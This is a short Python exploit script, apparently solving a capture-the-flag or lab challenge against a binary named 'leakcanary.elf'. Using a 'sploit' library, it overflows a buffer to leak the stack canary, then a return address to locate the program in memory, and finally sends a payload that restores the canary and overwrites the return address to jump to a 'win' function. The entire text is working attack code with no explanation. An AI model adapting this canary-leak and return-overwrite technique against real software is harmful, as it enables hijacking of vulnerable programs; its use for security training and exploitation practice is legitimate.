from sploit.until import lastline, contains, equals
from sploit.arch import btoi, arch
from sploit.mem import Symtbl
from sploit.payload import Payload
from sploit.rev.elf import ELF

elf = ELF('leakcanary.elf')
elf.sym.leak = elf.retaddr(elf.sym.main,elf.sym.vuln)[0]
stack = elf.locals.vuln
stack.ret = arch.wordsize
stack.rebase(stack.buf)

def menu(choice):
    io.readlineuntil(lastline,contains,b'Choice')
    io.writeline(choice)

p = Payload().bin(b'GREP').pad_front(stack.canary+1)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
canary = b'\x00' + io.read(arch.wordsize-1)
canary = btoi(canary)
print("Leaked Canary: "+hex(canary))

p = Payload().bin(b'GREP').pad_front(stack.ret)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked Address: "+hex(addr))
elf.sym = elf.sym.map(addr,elf.sym.leak)

p = Payload().pad(stack.canary).int(canary).sbp().ret(elf.sym.win)

menu(b'1')
io.readlineuntil(lastline,contains,b'Enter')
print("Injecting Return Address: "+hex(elf.sym.win))
io.write(p())

menu(b'2')

